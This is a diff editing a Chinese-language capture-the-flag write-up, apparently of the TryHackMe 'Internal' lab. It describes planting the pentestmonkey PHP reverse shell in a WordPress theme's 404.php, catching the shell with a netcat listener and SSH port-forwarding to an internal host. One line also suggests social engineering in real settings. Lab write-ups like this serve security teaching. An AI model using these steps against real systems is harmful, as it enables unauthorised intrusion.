@@ -540,9 +540,9 @@ Finished
 
 尝试利用获得的Username与Password登录 `http://10.49.151.11/blog/wp-admin/`
 
-登录后首先获得了信息  Current administration email: admin@internal.thm (实际环境中应该有用)
+登录后首先获得了信息  `Current administration email: admin@internal.thm` (实际环境中可以尝试社会工程等手段)
 
-进入后台之后, 最常见的就是针对模板主体的PHP Reverse Shell利用 (pentestmonkey/php-reverse-shell)
+进入后台之后, 最常见的就是针对主题的模板内容进行 PHP Reverse Shell 利用 (pentestmonkey/php-reverse-shell)
 
 替换 404.php 中内容, 选择 Upload file 
 
@@ -566,8 +566,6 @@ http://10.49.151.11/blog/wp-content/themes/twentyseventeen/404.php
 ➜  internal nc -lvnp 1234                    
 Listening on 0.0.0.0 1234
 Connection received on 10.49.151.11 47478
-Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 02:38:05 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
@@ -666,11 +664,6 @@ aubreanna@internal:~$
 
 ```
 ➜  internal ssh -L 8080:172.17.0.2:8080 aubreanna@10.49.151.11
-The authenticity of host '10.49.151.11 (10.49.151.11)' can't be established.
-ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.49.151.11' (ED25519) to the list of known hosts.
 aubreanna@10.49.151.11's password: 
 ```
 
